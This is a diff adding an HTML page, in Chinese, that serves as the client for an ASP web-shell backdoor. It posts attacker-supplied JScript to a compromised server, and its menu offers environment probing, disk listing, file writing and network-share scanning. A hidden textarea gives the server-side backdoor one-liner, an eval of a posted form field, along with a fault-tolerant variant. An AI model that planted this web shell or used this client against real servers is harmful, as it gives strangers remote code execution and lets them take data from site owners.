@@ -1,0 +1,76 @@
+<HTML >
+<HEAD>
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=gb2312" />
+<TITLE>欢迎光临冰狐浪子网络技术实验室</TITLE>
+<link rel="stylesheet" type="text/css" href="css.css">
+</HEAD>
+<BODY TOPMARGIN="0"  LEFTMARGIN="0" MARGINHEIGHT="0" MARGINWIDTH="0">
+<CENTER style="cursor:hand;">
+冰狐浪子微型ASP后门客户端2.0测试版<BR>
+&copy;版权所有：冰狐浪子网络技术实验室&#8482<BR>
+</CENTER>
+ASP URL :
+<input style="WIDTH:50%" type="text" name="url" value="http:///ASP.asp" />
+PassWord:
+<input style="WIDTH:20%" type="text" name="PW" value="#" />
+<BR/>
+
+<select name="Javascript" onchange="daima.location=this.value+'.htm';">
+	<option value="ASP客户端2.0">ASP客户端2.0</option>
+	<option value="写入存在的文件">写入存在的文件</option>
+	<option value="环境探测" selected>环境探测</option>
+	<option value="磁盘信息">磁盘信息</option>
+	<option value="搜索网络邻居共享">搜索网络邻居共享</option>
+</select>
+
+<input style="WIDTH:100%" onclick="daima.RUNonclick();" type="submit" name="RUN" value="RUN" onFocus="this.blur();" />
+
+<iframe name=daima style="height:150px;width:100%;" src="环境探测.htm"></iframe>
+
+<BR/><BR/>
+<input style="WIDTH:100%" onclick="RUNonclick();" type="submit" name="MYRUN" value="RUN MY CODE" onFocus="this.blur();"/>
+<form name="codeform" method="post" action="" target=_blank>
+<textarea style="HEIGHT:200px" name="code">
+//本机局域网地址
+try{
+var net = new ActiveXObject("WSCRIPT.NETWORK");
+Response.write("本机局域网地址: \\\\"+net.ComputerName+"\\"+net.UserName);
+}catch(e){}
+
+</textarea>
+
+</form>
+<script>
+function RUNonclick(){
+with(document.codeform){
+code.name=PW.value;
+action=url.value;
+submit();}
+}
+</script>
+
+<textarea style="HEIGHT:0px" name="code">
+冰狐浪子微型ASP后门使用说明
+一：服务端代码
+<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>eval(Request.form('#')+'')</SCRIPT>
+
+容错格式：
+
+<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>try{eval(Request.form('#')+'')}catch(e){}</SCRIPT>
+
+二：关于作者
+
+OICQ号码:       76416026
+网　　名:       icyfoxlovelace／冰狐浪子
+邮箱地址:       icyfox at eyou.com
+</textarea>
+
+<CENTER style="cursor:hand;">
+本程序参考海阳顶端网ASP木马等一些asp程序源代码写成！感谢你们所做的努力！欢迎交流！
+<BR>
+本2.0把常用功能集成到一起，以方便使用，服务端代码无需改变！
+</CENTER>
+
+<font id=ifl style="left:0;bottom:0;">冰</font>
+<font id=ifl style="right:0;bottom:0;">狐</font>
+</BODY></HTML>
